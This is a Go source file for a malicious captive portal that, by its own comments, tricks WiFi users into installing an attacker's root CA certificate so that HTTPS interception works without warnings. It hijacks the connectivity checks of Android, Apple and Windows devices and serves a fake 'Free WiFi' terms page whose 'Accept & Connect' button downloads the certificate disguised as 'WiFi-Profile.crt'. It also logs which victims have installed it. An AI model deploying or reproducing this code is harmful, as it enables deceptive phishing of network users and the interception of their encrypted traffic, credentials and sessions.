package portal

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
)

// CaptivePortal intercepts HTTP traffic and presents a page that tricks
// victims into installing our root CA certificate. Once installed,
// all HTTPS interception works without certificate warnings.
type CaptivePortal struct {
	caCertPEM  []byte
	listenAddr string
	gatewayIP  string
	server     *http.Server
	installed  map[string]bool // IPs that have "installed"
}

func NewCaptivePortal(caCertPEM []byte, listenAddr, gatewayIP string) *CaptivePortal {
	return &CaptivePortal{
		caCertPEM:  caCertPEM,
		listenAddr: listenAddr,
		gatewayIP:  gatewayIP,
		installed:  make(map[string]bool),
	}
}

func (cp *CaptivePortal) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", cp.handlePortal)
	mux.HandleFunc("/cert", cp.handleCertDownload)
	mux.HandleFunc("/done", cp.handleDone)
	mux.HandleFunc("/generate_204", cp.handleConnectivityCheck)
	mux.HandleFunc("/hotspot-detect.html", cp.handleConnectivityCheck)
	mux.HandleFunc("/connecttest.txt", cp.handleConnectivityCheck)
	mux.HandleFunc("/ncsi.txt", cp.handleConnectivityCheck)

	cp.server = &http.Server{
		Addr:    cp.listenAddr,
		Handler: mux,
	}

	log.Printf("[CAPTIVE PORTAL] Listening on %s", cp.listenAddr)
	go func() {
		if err := cp.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("[CAPTIVE PORTAL] Server error: %v", err)
		}
	}()

	return nil
}

func (cp *CaptivePortal) Stop() {
	if cp.server != nil {
		cp.server.Close()
	}
}

func (cp *CaptivePortal) handleConnectivityCheck(w http.ResponseWriter, r *http.Request) {
	clientIP := getClientIP(r)
	if cp.installed[clientIP] {
		// Let them through after "installing"
		if strings.Contains(r.URL.Path, "generate_204") {
			w.WriteHeader(204)
			return
		}
		w.WriteHeader(200)
		fmt.Fprint(w, "Microsoft Connect Test")
		return
	}
	// Redirect to portal
	http.Redirect(w, r, fmt.Sprintf("http://%s/", cp.gatewayIP), http.StatusFound)
}

func (cp *CaptivePortal) handlePortal(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")

	fmt.Fprintf(w, portalHTML, cp.gatewayIP, cp.gatewayIP)
}

func (cp *CaptivePortal) handleCertDownload(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/x-x509-ca-cert")
	w.Header().Set("Content-Disposition", "attachment; filename=WiFi-Profile.crt")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(cp.caCertPEM)))
	w.Write(cp.caCertPEM)

	clientIP := getClientIP(r)
	log.Printf("[CAPTIVE PORTAL] CA cert downloaded by %s", clientIP)
}

func (cp *CaptivePortal) handleDone(w http.ResponseWriter, r *http.Request) {
	clientIP := getClientIP(r)
	cp.installed[clientIP] = true
	log.Printf("[CAPTIVE PORTAL] Client %s marked as complete", clientIP)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, doneHTML)
}

func getClientIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

const portalHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%%,#764ba2 100%%);color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{max-width:420px;width:90%%;background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);overflow:hidden}
.header{background:#fff;padding:32px 24px 16px;text-align:center;border-bottom:1px solid #eee}
.header .wifi-icon{font-size:48px;margin-bottom:8px}
.header h1{font-size:20px;font-weight:700;color:#1a1a2e}
.header p{font-size:13px;color:#888;margin-top:4px}
.body{padding:24px}
.body p{margin-bottom:16px;line-height:1.6;font-size:14px;color:#555}
.terms{background:#f8f9fa;border-radius:10px;padding:16px;margin:16px 0;font-size:12px;color:#777;line-height:1.6;max-height:120px;overflow-y:auto}
.btn{display:block;width:100%%;padding:14px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;margin-bottom:10px;transition:transform .1s}
.btn:active{transform:scale(.98)}
.btn-connect{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
.btn-skip{background:transparent;color:#888;font-size:13px;font-weight:400}
.footer{padding:12px 24px;text-align:center;font-size:10px;color:#bbb}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="wifi-icon">&#128246;</div>
<h1>Welcome to Free WiFi</h1>
<p>High-speed internet access</p>
</div>
<div class="body">
<p>Accept our terms of service to connect to the internet. A WiFi profile will be installed to optimize your connection.</p>
<div class="terms">
By connecting, you agree to the acceptable use policy. This network may monitor traffic for security purposes. Users must not engage in illegal activity. Service is provided as-is without warranty. Maximum session: 24 hours. The network operator reserves the right to disconnect users at any time.
</div>
<a href="http://%s/cert" class="btn btn-connect">Accept &amp; Connect</a>
<a href="http://%s/done" class="btn btn-skip">Skip for now</a>
</div>
<div class="footer">Powered by NetConnect &bull; Terms of Service apply</div>
</div>
</body>
</html>`

const doneHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f5f5f5;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{max-width:400px;text-align:center;padding:48px 24px}
.check{font-size:64px;margin-bottom:16px}
h1{font-size:24px;color:#2e7d32;margin-bottom:12px}
p{color:#666;line-height:1.6;font-size:14px}
</style>
<meta http-equiv="refresh" content="3;url=http://www.google.com">
</head>
<body>
<div class="container">
<div class="check">&#9989;</div>
<h1>You're Connected!</h1>
<p>Your device is now securely connected to the network. Redirecting you to the internet...</p>
</div>
</body>
</html>`
